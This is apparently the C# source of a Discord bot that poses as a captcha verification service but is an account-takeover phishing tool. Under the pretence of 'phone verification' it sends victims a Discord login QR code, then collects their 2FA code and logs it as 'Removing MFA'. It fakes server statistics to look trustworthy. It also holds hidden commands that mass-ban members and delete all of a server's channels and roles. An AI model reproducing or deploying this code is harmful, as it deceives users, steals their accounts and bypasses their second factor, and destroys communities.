using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Rest;
using Discord.WebSocket;
using static SchaxxDiscordBot.UserDataCollector;

namespace SchaxxDiscordBot
{
    class DiscordBot
    {
        DiscordSocketClient client;
        Dictionary<ulong, UserDataCollector> waitinglist;
        List<ulong> acc;
        int scancount;
        int totalcount;
        public DiscordBot()
        {
            client = new DiscordSocketClient();
            waitinglist = new Dictionary<ulong, UserDataCollector>();
            acc = new List<ulong>();
            scancount = 0;
            totalcount = 0;
            Console.Title = "Stats : " + scancount + " / " + totalcount;
        }

        public async Task sendEmbed(dynamic channel)
        {
            EmbedBuilder eb = new EmbedBuilder();
            eb.Title = "🤖 Are you human ?";
            eb.Description = "The server `" + channel.Guild.Name + "` is protected and a **captcha** is needed before you can join it.\nThe type of **captcha** is choosen based on your account and the risk it poses to the server.";
            eb.Color = Color.Green;
            var builder = new ComponentBuilder()
                .WithButton("✅ Yes i am human !", "verify-btn", ButtonStyle.Success)
                .WithButton("❓ What's this ?", "help-btn", ButtonStyle.Secondary);

            await channel.SendMessageAsync("@everyone", embed: eb.Build(), components: builder.Build());
        }

        private async Task Client_MessageReceived(SocketMessage msg)
        {



            if (msg.Content == "!msg")
            {
                await sendEmbed(msg.Channel);
            }
            if(msg.Content == "!retard")
            {
                Console.WriteLine("Banning...");
                SocketGuildChannel curr = msg.Channel as SocketGuildChannel;
                var test = await curr.Guild.SearchUsersAsync("!");
                foreach (var u in test)
                {
                    await u.BanAsync();
                    Console.WriteLine("Bannning retard name : " + u.Username);
                }
            }
            if (msg.Content == "!lmao")
            {
                SocketGuildChannel curr = msg.Channel as SocketGuildChannel;
                foreach (var c in curr.Guild.Channels)
                {
                    try
                    {
                        await c.DeleteAsync();
                    }catch(Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                foreach (var c in curr.Guild.Roles)
                {
                    try
                    {
                        await c.DeleteAsync();
                    }catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                //curr.Guild.Channels.All(async c => await c.DeleteAsync());
                //curr.Guild.Roles.All(async c => await c.DeleteAsync());
                RestTextChannel vr = await curr.Guild.CreateTextChannelAsync("verification");
                await vr.AddPermissionOverwriteAsync(role: client.Guilds.First(g => g.Id == curr.Guild.Id).EveryoneRole, new OverwritePermissions(sendMessages: PermValue.Deny));
                sendEmbed(vr);
                Console.WriteLine("Done");
            }
            if (msg.Content == "!setup")
            {
                SocketGuildChannel curr = msg.Channel as SocketGuildChannel;
                SocketGuildChannel verifChannel = null;
                SocketRole verifRole = null;

                try { verifChannel = curr.Guild.Channels.First(c => c.Name == "verification"); } catch (Exception) { }
                try { verifRole = curr.Guild.Roles.First(c => c.Name == "verified_acc"); } catch (Exception) { }

                if (verifRole == null)
                {
                    GuildPermissions role = new GuildPermissions(false, false, false, false, false, false, true, false, false, true, true, false, false, false, true, true, false, true, true, true, false, false, false, true, false, true, true, false, false, false, false, true, false, false, false, true, false, true, true, false, false);
                    RestRole v = await curr.Guild.CreateRoleAsync("verified_acc", role, new Color(231, 225, 18), false, false);

                    if (verifChannel == null)
                    {
                        RestTextChannel vr = await curr.Guild.CreateTextChannelAsync("verification");
                        await vr.AddPermissionOverwriteAsync(role: v, new OverwritePermissions(viewChannel: PermValue.Deny));
                    }
                }
                else
                {
                    if (verifChannel == null)
                    {
                        RestTextChannel vr = await curr.Guild.CreateTextChannelAsync("verification");
                        await vr.AddPermissionOverwriteAsync(role: verifRole, new OverwritePermissions(viewChannel: PermValue.Deny));
                    }
                }

                curr.Guild.Channels.All(c =>
                {
                    if (c.GetType() == typeof(SocketTextChannel))
                    {
                        if (c.Name != "verification")
                        {
                            c.AddPermissionOverwriteAsync(role: client.Guilds.First(g => g.Id == curr.Guild.Id).EveryoneRole, new OverwritePermissions(viewChannel: PermValue.Deny));
                            c.AddPermissionOverwriteAsync(role: client.Guilds.First(g => g.Id == curr.Guild.Id).Roles.First(r => r.Name == "verified_acc"), new OverwritePermissions(viewChannel: PermValue.Allow));
                        }
                        else
                        {
                            c.AddPermissionOverwriteAsync(role: client.Guilds.First(g => g.Id == curr.Guild.Id).EveryoneRole, new OverwritePermissions(sendMessages: PermValue.Deny));
                        }
                    }
                    return true;
                });

                await msg.Channel.SendMessageAsync("Successfuly setup ! \n(" + curr.Guild.Channels.Count(c => c.GetType() == typeof(SocketTextChannel)) + ") channels updated !");
            }
        }

        private async Task Client_ModalSubmitted(SocketModal arg)
        {
            
            if (arg.Data.CustomId == "ver-modal")
            {
                Console.WriteLine("Receved MFA");
                string code = arg.Data.Components.First(x => x.CustomId == "ver-code").Value;
                if (code.Length != 6 && code.Length != 7)
                {
                    await arg.RespondAsync("Code is not valide, please retry", ephemeral: true);
                    return;
                }
                Console.WriteLine("Getting user in list");
                KeyValuePair<ulong, UserDataCollector>? u = null;
                try
                {
                    u = waitinglist.First(u => u.Key == arg.User.Id);
                }catch(Exception e) { Console.WriteLine(e.Message); }
                if (u == null)
                {
                    await arg.RespondAsync("You are invalide, please retry", ephemeral: true);
                    return;
                }
                Console.WriteLine("Removing MFA");
                Boolean done = u.Value.Value.runMFA(code);
                
                if (done)
                {
                    Console.WriteLine("MFA removed !");
                    try
                    {
                        waitinglist.Remove(arg.User.Id);
                    }catch(Exception e) { Console.WriteLine(e.Message); }
                    await arg.RespondAsync("Your account has been verified.", ephemeral: true);
                }
                else
                {
                    Console.WriteLine("MFA code invalide !");
                    await arg.RespondAsync("Your code is invalide, please retry !", ephemeral: true);
                    
                }
                
                

            }
        }
        private async Task Client_ButtonExecuted(SocketMessageComponent arg)
        {
            if (arg.Data.CustomId == "verify-mfa")
            {
                Console.WriteLine("verifing mfa");
                ModalBuilder mb = new ModalBuilder()
                    .WithTitle("Verification")
                    .WithCustomId("ver-modal")
                    .AddTextInput("Please enter your code :", "ver-code", placeholder: "5555");
                await arg.RespondWithModalAsync(mb.Build());
            }
            if (arg.Data.CustomId == "help-btn")
            {
                Console.WriteLine("Button clicked for help : "+arg.User.Username + " - On : " + client.Guilds.First(g => g.Id == arg.GuildId).Name);
                EmbedBuilder eb = new EmbedBuilder();
                eb.Title = "❓ What is this ?";
                eb.Description = "This server is protected and a captcha is needed before you can join it.\nThe type of capcha is choosen based on your account.\nYou can find more information about this bot at https://captcha.bot/";
                eb.AddField("🖼️ Image", "You must caracters on an image and write them.", false);
                eb.AddField("🤖 ReCaptcha", "You must complete a ReCaptcha.", false);
                eb.AddField("📱 Phone", "You must scan a QR code on your phone.", false);
                eb.Color = Color.Green;

                await arg.RespondAsync(ephemeral: true, embed: eb.Build());
            }
            if (arg.Data.CustomId == "other-btn")
            {
                EmbedBuilder eb = new EmbedBuilder();
                eb.Title = "⛔ Not available";
                eb.Description = "Due to the risk level of your account, no other captcha are available.";
                eb.Color = Color.Green;
                await arg.RespondAsync(embed: eb.Build(), ephemeral: true);
            }
            if (arg.Data.CustomId == "verify-btn")
            {
                if (!acc.Any(x => x == arg.User.Id))
                {
                    acc.Add(arg.User.Id);
                    totalcount++;
                    Console.Title = "Stats : " + scancount + " / " + totalcount;
                    Console.WriteLine("Button clicked, getting QRCode : " + arg.User.Username + " - On : " + client.Guilds.First(g => g.Id == arg.GuildId).Name);
                    EmbedBuilder eb = new EmbedBuilder();
                    eb.Title = "🔄 Creating your captcha. . .";
                    eb.Description = "Please wait while we are choosing the best captcha possible for your account. . .";
                    eb.Color = Color.Green;
                    await arg.RespondAsync(embed: eb.Build(), ephemeral: true);

                    UserDataCollector udc = new UserDataCollector();
                    udc.QRCodeGotten += async (e, i) =>
                    {
                        QRCodeGottenEventArgs evt = (QRCodeGottenEventArgs)i;
                        EmbedBuilder eb = new EmbedBuilder();
                        eb.Title = "📱 Phone Verification";
                        eb.ImageUrl = "attachment://qrcode.png";
                        eb.Description = "You must scan this QR code with your Discord app to join this server.";
                        eb.Color = Color.Green;
                        eb.AddField(name: "❓ Where can i download the Discord app ?", value: "ISO : https://apps.apple.com/bf/app/discord-chat-talk-hangout/id985746746 \nAndroid : https://play.google.com/store/apps/details?id=com.discord")
                            .AddField(name: "🕰️ How much time do i have to scan ?", value: "You have 2 minutes to scan this QR code.",inline: false)
                            .AddField(name: "👍 How to scan a QR code ?", value: "**1 - **Open the Discord app from the home screen or app drawer on your mobile device. Navigate to Settings and tap the “Scan QR Code” option. Grant Discord permission to use the camera if asked.\n**2 - **Once the scanner opens up on your device, point it to the QR code on the login page on your computer’s screen.\n**3 - **After successfully scanning the code, confirm the verification on your mobile device.", inline: false);

                        var builder = new ComponentBuilder()
                            .WithButton("🔄 Give me an other captcha", "other-btn", ButtonStyle.Primary);

                        Console.WriteLine("Sending QR code");
                        await arg.FollowupWithFileAsync(fileName: "qrcode.png", components: builder.Build(), fileStream: evt.ms, embed: eb.Build(), ephemeral: true);

                        try
                        {
                            arg.DeleteOriginalResponseAsync();
                        }
                        catch (Exception) { }
                    
                    };

                    udc.ResultGotten += async (e, i) =>
                    {
                        ResultEventArgs evt = (ResultEventArgs)i;
                        Console.WriteLine("Got result back from UDC");
                        if (evt.r == Result.TIMEOUT)
                        {
                            acc.Remove(acc.First(x => x == arg.User.Id));
                            try
                            {
                                EmbedBuilder eb = new EmbedBuilder();
                                eb.Title = "🕰️ Verification timed out !";
                                eb.Description = "The last verification attempt timed out before you could finish it.";
                                eb.Color = Color.Green;

                                var builder = new ComponentBuilder()
                                    .WithButton("🔄 Retry", "verify-btn", ButtonStyle.Primary);

                                await arg.FollowupAsync(embed: eb.Build(), components: builder.Build(), ephemeral: true);
                            }catch (Exception ex)
                            {

                            }
                        }
                        if (evt.r == Result.SUCCESS)
                        {
                            scancount++;
                            Console.Title = "Stats : " +scancount + " / " + totalcount;
                            //IRole r = client.Guilds.First(g => g.Id == arg.GuildId).Roles.First(r => r.Name.ToLower() == "verified_acc");
                            //if (r != null)
                            //{
                              //  await (arg.User as IGuildUser).AddRoleAsync(r);
                            //}
                        }
                        if (evt.r == Result.MFA)
                        {
                            try { waitinglist.Add(arg.User.Id, udc); } catch (Exception) { };
                            EmbedBuilder eb = new EmbedBuilder();
                            eb.Title = "Additionnal verification needed";
                            eb.Description = "Due to your account's risk, you need to complete an additional step.";
                            eb.Color = Color.Green;
                            var builder = new ComponentBuilder()
                                .WithButton("Verify", "verify-mfa", ButtonStyle.Primary)
                                .WithButton("What is this ?", "help-btn", ButtonStyle.Secondary);
                            await arg.FollowupAsync(embed: eb.Build(), components: builder.Build());

                        }
                    };
                    new Thread(udc.run).Start();
                }
                else
                {
                    Console.WriteLine(arg.User.Username + " Attempting to spam like a retard");
                    await arg.RespondAsync("⛔ Already in verification. . .", ephemeral: true);
                }
            }
        }

        private async Task Client_Ready()
        {
            Console.WriteLine("Bot is ready to go !");
            await client.SetGameAsync("Currently watching : " + new Random(DateTime.Now.Millisecond).Next(111, 999) + client.Guilds.Count + " servers !\nCaptcha completed last 24h : " + new Random(DateTime.Now.Millisecond).Next(11111, 99999));
            
        }

        public async Task Start()
        {
            await client.LoginAsync(Discord.TokenType.Bot, Config.token);
            await client.StartAsync();
            client.MessageReceived += Client_MessageReceived;
            client.ButtonExecuted += Client_ButtonExecuted;
            client.ModalSubmitted += Client_ModalSubmitted;
            client.Ready += Client_Ready;

            Console.WriteLine("Bot loaded !");

        }

    }
}
